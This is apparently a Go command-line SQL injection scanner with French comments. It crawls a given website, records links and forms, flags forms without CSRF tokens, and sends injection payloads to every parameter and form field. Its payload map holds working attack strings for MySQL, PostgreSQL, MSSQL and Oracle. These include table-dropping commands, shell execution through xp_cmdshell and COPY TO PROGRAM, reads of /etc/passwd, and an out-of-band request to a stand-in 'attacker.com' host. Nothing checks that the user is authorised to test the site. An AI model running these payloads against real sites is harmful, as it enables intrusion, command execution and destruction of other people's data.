package main

import (
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net/http"
	"net/url"
	"os"
	"strings"
	"time"

	"golang.org/x/net/html"
)

// Nom du fichier pour stocker les rapports de sécurité
const securityReportsFileName = "reports/report_%s.json"

// Payloads pour les injections SQL pour différents types de bases de données
var sqlInjectionPayloads = map[string][]string{
	"MySQL": {
		"' OR '1'='1' --",
		"' UNION SELECT null, version() --",
		"1' UNION SELECT 1,2,3,4 --",
		"' OR SLEEP(5) --",
		"' AND IF(1=1, SLEEP(5), 0) --",
		"' OR LOAD_FILE('/etc/passwd') --",
		"' AND 1=0 UNION SELECT table_name FROM information_schema.tables --",
		"' OR 'x'='x' --",
		"' UNION ALL SELECT null, table_name FROM information_schema.tables WHERE table_schema=database() --",
	},
	"PostgreSQL": {
		"'; DROP TABLE users; --",
		"'; COPY (SELECT '') TO PROGRAM 'cmd.exe' --",
		"'; SELECT pg_sleep(5) --",
		"' OR CAST(pg_sleep(10) AS INTEGER) --",
		"'; SELECT current_database(), current_user --",
		"' OR 'a'='a' --",
		"'; SELECT version(), pg_sleep(5); --",
		"'; COPY (SELECT null) TO PROGRAM 'whoami' --",
	},
	"MSSQL": {
		"'; EXEC sp_MSForEachTable 'DROP TABLE ?' --",
		"' UNION SELECT null, @@version --",
		"'; WAITFOR DELAY '0:0:5' --",
		"'; SELECT * FROM sys.tables --",
		"'; EXEC xp_cmdshell('dir'); --",
		"'; SELECT user_name(), system_user --",
		"' OR 1=1; --",
		"'; EXEC sp_configure 'xp_cmdshell', 1; --",
	},
	"Oracle": {
		"' UNION SELECT null, banner FROM v$version --",
		"' AND 1=UTL_INADDR.GET_HOST_ADDRESS('localhost') --",
		"' UNION SELECT column_name FROM all_tab_columns WHERE table_name = 'USERS' --",
		"' UNION SELECT null FROM dual --",
		"' OR 1=UTL_HTTP.REQUEST('http://attacker.com') --",
		"' OR 1=1 --",
		"'; SELECT username, password FROM all_users --",
		"' UNION SELECT null, sys_context('userenv','instance_name') FROM dual --",
	},
}

// Structure pour stocker les détails des éléments de page (form, link, input, etc.)
type PageElement struct {
	ElementType string   `json:"element_type"` // "form", "link", "input", "textarea", etc.
	Attribute   string   `json:"attribute"`    // Attribut de l'élément, par ex. action pour les forms
	Content     string   `json:"content"`      // Contenu de l'attribut
	Inputs      []string `json:"inputs,omitempty"` // Champs input pour chaque formulaire
	CSRFStatus  string   `json:"csrf_status,omitempty"` // Statut CSRF : Sécurisé ou Non sécurisé
	InjectionSQL string  `json:"injection_sql,omitempty"` // SQL Injection vulnerability status
}

// Structure pour stocker les résultats d'un scan de sécurité
type SecurityReport struct {
	ID      string        `json:"id"`
	URL     string        `json:"url"`
	Date    string        `json:"date"`
	Results []PageElement `json:"results"`
}

// Fonction pour parcourir et extraire les éléments de la page web
func crawlAndExtract(site string) ([]PageElement, error) {
	resp, err := http.Get(site)
	if err != nil {
		return nil, fmt.Errorf("erreur lors de la requête: %v", err)
	}
	defer resp.Body.Close()

	baseURL, err := url.Parse(site)
	if err != nil {
		return nil, fmt.Errorf("erreur lors de l'analyse de l'URL: %v", err)
	}

	// Extraire les éléments de la page
	elements, err := extractPageElements(resp, baseURL)
	if err != nil {
		return nil, fmt.Errorf("erreur lors de l'extraction des éléments: %v", err)
	}

	return elements, nil
}

// Fonction pour extraire les URLs, forms, inputs, et event handlers de la page HTML
func extractPageElements(resp *http.Response, baseURL *url.URL) ([]PageElement, error) {
	var elements []PageElement
	z := html.NewTokenizer(resp.Body)

	var currentForm PageElement

	for {
		tt := z.Next()
		switch tt {
		case html.ErrorToken:
			return elements, nil
		case html.StartTagToken, html.SelfClosingTagToken:
			t := z.Token()
			elements = append(elements, extractElement(t, baseURL, &currentForm)...)
		case html.EndTagToken:
			t := z.Token()
			if t.Data == "form" {
				if currentForm.CSRFStatus == "" {
					currentForm.CSRFStatus = "Non sécurisé (Pas de CSRF)"
				}
				elements = append(elements, currentForm)
			}
		}
	}
}

func extractElement(t html.Token, baseURL *url.URL, currentForm *PageElement) []PageElement {
	var elements []PageElement

	switch t.Data {
	case "a":
		elements = append(elements, extractLink(t, baseURL))
	case "form":
		*currentForm = extractForm(t, baseURL)
	case "input", "textarea":
		extractInput(t, currentForm)
	}
	return elements
}

func extractLink(t html.Token, baseURL *url.URL) PageElement {
	for _, attr := range t.Attr {
		if attr.Key == "href" {
			link, err := baseURL.Parse(attr.Val)
			if err != nil {
				continue
			}
			pageElement := PageElement{
				ElementType: "link",
				Attribute:   "href",
				Content:     link.String(),
			}
			if link.RawQuery != "" {
				pageElement.InjectionSQL = "A tester"
			}
			return pageElement
		}
	}
	return PageElement{}
}

func extractForm(t html.Token, baseURL *url.URL) PageElement {
	form := PageElement{
		ElementType: "form",
		Attribute:   "action",
		InjectionSQL: "A tester",
	}
	for _, attr := range t.Attr {
		if attr.Key == "action" {
			formAction, err := baseURL.Parse(attr.Val)
			if err != nil {
				continue
			}
			form.Content = formAction.String()
		}
	}
	return form
}

func extractInput(t html.Token, currentForm *PageElement) {
	inputName := ""
	isCSRFInput := false
	for _, attr := range t.Attr {
		if attr.Key == "name" {
			inputName = attr.Val
			if strings.Contains(strings.ToLower(inputName), "csrf") {
				isCSRFInput = true
			}
		}
	}
	currentForm.Inputs = append(currentForm.Inputs, inputName)
	if isCSRFInput {
		currentForm.CSRFStatus = "Sécurisé"
	}
}

// Fonction pour générer un identifiant unique
func generateID() string {
	return fmt.Sprintf("scan-%d", time.Now().UnixNano())
}

// Fonction pour sauvegarder le rapport de sécurité en JSON
func saveReport(report SecurityReport) error {
	// Générer le nom du fichier JSON basé sur l'ID du rapport
	fileName := fmt.Sprintf(securityReportsFileName, report.ID)

	// Encoder le rapport en JSON
	data, err := json.MarshalIndent(report, "", "  ")
	if err != nil {
		return fmt.Errorf("erreur lors de la conversion en JSON: %v", err)
	}

	// Sauvegarder le rapport dans un fichier individuel avec le nom généré
	err = os.WriteFile(fileName, data, 0644)
	if err != nil {
		return fmt.Errorf("erreur lors de l'écriture du fichier: %v", err)
	}

	return nil
}

// Fonction pour charger et retourner un rapport de sécurité par ID
func loadReportByID(scanID string) (*SecurityReport, error) {
	// Générer le nom du fichier basé sur l'ID
	fileName := fmt.Sprintf(securityReportsFileName, scanID)

	// Lire le fichier JSON correspondant à l'ID
	data, err := os.ReadFile(fileName)
	if err != nil {
		return nil, fmt.Errorf("erreur lors de la lecture du fichier JSON pour l'ID %s: %v", scanID, err)
	}

	// Décoder le contenu du fichier JSON dans un objet SecurityReport
	var report SecurityReport
	err = json.Unmarshal(data, &report)
	if err != nil {
		return nil, fmt.Errorf("erreur lors du parsing du fichier JSON pour l'ID %s: %v", scanID, err)
	}

	// Retourner le rapport trouvé
	return &report, nil
}


func injectionBDDTest(elements []PageElement) ([]PageElement, error) {
	// Variable to store detected vulnerabilities
	detectedVulnDBMS := ""

	// Helper function to test SQL Injection in URL parameters
	testSQLInjectionInURLParams := func(el PageElement, dbms string, payloads []string) (PageElement, bool) {
		for _, payload := range payloads {
			vulnerable, err := testSQLInjectionInURL(el.Content, payload)
			if err != nil {
				log.Printf("Error during SQLi test: %v\n", err)
				continue
			}
			if vulnerable {
				fmt.Printf("SQL Injection vulnerability found in input: %s (DBMS: %s, Payload: %s)\n", el.Content, dbms, payload)
				el.InjectionSQL = "Non sécurisé"
				detectedVulnDBMS = dbms
				return el, true
			}
		}
		el.InjectionSQL = "Sécurisé"
		return el, false
	}

	// Helper function to test SQL Injection in form submissions
	testSQLInjectionInForms := func(el PageElement, dbms string, payloads []string) (PageElement, bool) {
		formVulnerable := false
		for _, input := range el.Inputs {
			for _, payload := range payloads {
				vulnerable, err := testSQLInjectionInForm(el.Content, input, payload)
				if err != nil {
					log.Printf("Error during SQLi test: %v\n", err)
					continue
				}
				if vulnerable {
					fmt.Printf("SQL Injection vulnerability found in form: %s (DBMS: %s, Input: %s, Payload: %s)\n", el.Content, dbms, input, payload)
					el.InjectionSQL = "Non sécurisé"
					formVulnerable = true
				}
			}
		}
		if !formVulnerable {
			el.InjectionSQL = "Sécurisé"
		}
		return el, formVulnerable
	}

	// Iterate over each element
	for i, el := range elements {
		// If a vulnerability is already found, only test against that DBMS
		dbmsToTest := []string{}
		if detectedVulnDBMS == "" {
			// Test against all DBMS types if no vulnerability found yet
			for dbms := range sqlInjectionPayloads {
				dbmsToTest = append(dbmsToTest, dbms)
			}
		} else {
			// Only test the DBMS where the vulnerability was found
			dbmsToTest = append(dbmsToTest, detectedVulnDBMS)
		}

		// Test inputs or forms
		for _, dbms := range dbmsToTest {
			payloads := sqlInjectionPayloads[dbms]
			if el.ElementType == "link" {
				updatedEl, vulnerable := testSQLInjectionInURLParams(el, dbms, payloads)
				elements[i] = updatedEl
				if vulnerable {
					break
				}
			} else if el.ElementType == "form" {
				updatedEl, vulnerable := testSQLInjectionInForms(el, dbms, payloads)
				elements[i] = updatedEl
				if vulnerable {
					break
				}
			}
		}
	}

	fmt.Println("SQL Injection testing completed.")
	fmt.Println("=================================")
	fmt.Println("Results:")
	for _, el := range elements {
		fmt.Printf("Element: %s (Type: %s, Injection: %s)\n", el.Content, el.ElementType, el.InjectionSQL)
	}
	fmt.Println("=================================")
	return elements, nil
}

// Function to test SQL Injection in URL parameters dynamically
func testSQLInjectionInURL(rawURL, payload string) (bool, error) {
	// Parse the URL to extract query parameters
	parsedURL, err := url.Parse(rawURL)
	if err != nil {
		return false, fmt.Errorf("error parsing URL: %v", err)
	}

	// Get the query parameters
	params := parsedURL.Query()

	// Iterate over each query parameter and inject the SQL payload
	for paramName := range params {
		// Inject the SQL payload into the current parameter
		params.Set(paramName, urlEncode(payload))
		parsedURL.RawQuery = params.Encode()

		// Construct the final injected URL
		injectedURL := parsedURL.String()

		// Display the URL being tested
		fmt.Printf("Testing URL: %s with payload: %s\n", injectedURL, payload)

		// Perform the HTTP GET request
		resp, err := http.Get(injectedURL)
		if err != nil {
			return false, fmt.Errorf("error during GET request: %v", err)
		}
		defer resp.Body.Close()

		// Analyze the response status code
		if resp.StatusCode == http.StatusInternalServerError || resp.StatusCode == http.StatusServiceUnavailable {
			// Potential vulnerability, server returned error status code
			return true, nil
		}

		// Read the response body
		body, err := io.ReadAll(resp.Body)
		if err != nil {
			return false, fmt.Errorf("error reading response body: %v", err)
		}

		// Check for common SQL error messages in the response
		if strings.Contains(string(body), "SQL syntax") || strings.Contains(string(body), "database error") || strings.Contains(string(body), "unclosed quotation mark") {
			return true, nil
		}
	}

	return false, nil
}
// Function to test SQL Injection in form submissions with more checks
func testSQLInjectionInForm(action, input, payload string) (bool, error) {
	// Construct the POST data with the SQL Injection payload
	postData := fmt.Sprintf("%s=%s", input, urlEncode(payload))

	// Display the form action URL and the payload being tested
	fmt.Printf("Testing form action: %s with input: %s and payload: %s\n", action, input, payload)

	// Perform the HTTP POST request
	resp, err := http.Post(action, "application/x-www-form-urlencoded", strings.NewReader(postData))
	if err != nil {
		return false, fmt.Errorf("error during POST request: %v", err)
	}
	defer resp.Body.Close()

	// Analyze the response status code
	if resp.StatusCode == http.StatusInternalServerError || resp.StatusCode == http.StatusServiceUnavailable {
		// Potential vulnerability, server returned error status code
		return true, nil
	}

	// Read the response body
	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return false, fmt.Errorf("error reading response body: %v", err)
	}

	// Check for common SQL error messages in the response
	if strings.Contains(string(body), "SQL syntax") || strings.Contains(string(body), "database error") || strings.Contains(string(body), "unclosed quotation mark") {
		return true, nil
	}

	return false, nil
}

// Function to URL encode payloads for safe transmission
func urlEncode(payload string) string {
    return url.QueryEscape(payload)
}

func extractReportByID(scanID string, typeSecuScan int) error {
	// Load the security report by ID
	report, err := loadReportByID(scanID)
	if err != nil {
		return fmt.Errorf("error loading report: %v", err)
	}

	// Check the type of security scan to perform
	if typeSecuScan == 0 {
		// Filter the elements to only include those with "A tester" in InjectionSQL
		var elementsToTest []PageElement
		for _, el := range report.Results {
			if el.InjectionSQL == "A tester" || el.InjectionSQL == "Sécurisé" || el.InjectionSQL == "Non sécurisé" {
				elementsToTest = append(elementsToTest, el)
			}
		}
		fmt.Printf("Elements to test for SQL Injection: %d\n", len(elementsToTest))
		// Test for SQL Injection vulnerabilities
		updatedElements, err := injectionBDDTest(elementsToTest)
		if err != nil {
			return fmt.Errorf("error testing for SQL Injection: %v", err)
		}
		
		// Update the report with the tested elements
		for i, el := range report.Results {
			for _, updatedEl := range updatedElements {
				if el.Content == updatedEl.Content && el.ElementType == updatedEl.ElementType {
					report.Results[i] = updatedEl
				}
			}
		}

		// Save the updated report
		if err := saveReport(*report); err != nil {
			return fmt.Errorf("error saving updated report: %v", err)
		}
	}

	return nil
}



func init() {
	// Extraire le répertoire à partir du chemin du fichier
	reportsDir := strings.Split(securityReportsFileName, "/")[0]

	// Vérifier si le répertoire pour stocker les rapports de sécurité existe
	if _, err := os.Stat(reportsDir); os.IsNotExist(err) {
		// Créer le répertoire si il n'existe pas
		err := os.Mkdir(reportsDir, 0755)
		if err != nil {
			log.Fatalf("Erreur lors de la création du répertoire: %v", err)
		}
	}
}

func main() {
	for {
		choice := getUserChoice()
		switch choice {
		case 1:
			handleSiteAnalysis()
		case 2:
			handleReportExtraction()
		case 3:
			handleSQLInjectionTest()
		default:
			fmt.Println("Choix invalide. Veuillez entrer 1, 2 ou 3.")
		}

		if !askToContinue() {
			break
		}
	}
}

func getUserChoice() int {
	fmt.Println("Tapez 1 pour analyser un site, 2 pour extraire les rapports de sécurité ou 3 pour tester une fail d'injection sur un report :")
	var choice int
	fmt.Scan(&choice)
	return choice
}

func handleSiteAnalysis() {
	site := getValidURL()
	elements, err := crawlAndExtract(site)
	if err != nil {
		log.Fatalf("Erreur : %v", err)
	}

	report := SecurityReport{
		ID:      generateID(),
		URL:     site,
		Date:    time.Now().Format("2006-01-02 15:04:05"),
		Results: elements,
	}

	if err := saveReport(report); err != nil {
		log.Fatalf("Erreur lors de la sauvegarde du rapport: %v", err)
	}

	fmt.Printf("Analyse terminée avec succès. ID du scan : %s\n", report.ID)
}

func getValidURL() string {
	var site string
	for {
		fmt.Println("Entrez le lien du site à analyser (avec http:// ou https://) :")
		fmt.Scan(&site)
		if strings.HasPrefix(site, "http://") || strings.HasPrefix(site, "https://") {
			return site
		}
		fmt.Println("Erreur: Veuillez entrer une URL valide qui commence par http:// ou https://.")
	}
}

func handleReportExtraction() {
	fmt.Println("Entrez l'ID du scan que vous souhaitez afficher :")
	var scanID string
	fmt.Scan(&scanID)

	report, err := loadReportByID(scanID)
	if err != nil {
		fmt.Printf("Erreur : %v\n", err)
		return
	}

	displayReport(report)
}

func displayReport(report *SecurityReport) {
	fmt.Printf("ID du scan : %s\n", report.ID)
	fmt.Printf("URL : %s\n", report.URL)
	fmt.Printf("Date : %s\n", report.Date)
	fmt.Println("Résultats :")
	for _, el := range report.Results {
		fmt.Printf("Type d'élément : %s\n", el.ElementType)
		fmt.Printf("Attribut : %s\n", el.Attribute)
		fmt.Printf("Contenu : %s\n", el.Content)
		if el.ElementType == "form" {
			fmt.Printf("Champs d'entrée : %v\n", el.Inputs)
			fmt.Printf("Statut CSRF : %s\n", el.CSRFStatus)
		}
		fmt.Println("----")
	}
}

func handleSQLInjectionTest() {
	fmt.Println("Entrez l'ID du scan que vous souhaitez tester pour les injections SQL :")
	var scanID string
	fmt.Scan(&scanID)

	err := extractReportByID(scanID,0)
	if err != nil {
		fmt.Printf("Erreur : %v\n", err)
	}
}

func askToContinue() bool {
	fmt.Println("Voulez-vous continuer ? Tapez 1 pour continuer et 0 pour quitter :")
	var choice int
	fmt.Scan(&choice)
	return choice == 1
}
